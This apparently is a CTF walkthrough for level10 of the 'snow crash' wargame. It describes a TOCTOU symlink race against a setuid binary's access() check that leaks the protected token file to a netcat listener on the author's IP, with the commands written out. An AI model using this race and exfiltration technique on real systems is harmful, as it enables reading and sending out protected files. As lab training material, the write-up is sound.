For the network part, just listen with the command:

nc -l -s 192.168.1.3 -p 6969

Then send switch_link.c to <snow_crash_ip>/tmp and compile it.

After that create a file /tmp/mdr with 'mdr' in it and create a soft link
/tmp/lol that points to it. This passes the access() check.

The switch progam will delete the link and recreate it to point to the file we
want (~/token). Since there is some time that passes between the access call and
the open, we can launch the two at the same time, and hopefully the datarace
involved will work in our favor. Meaning that the access will be on the first
link to the valid file, and then the open on the link to token.

To do this, lauch this command:

/tmp/a.out | ./level10 /tmp/lol 192.168.1.3 1>&2

Then you should see the token :)
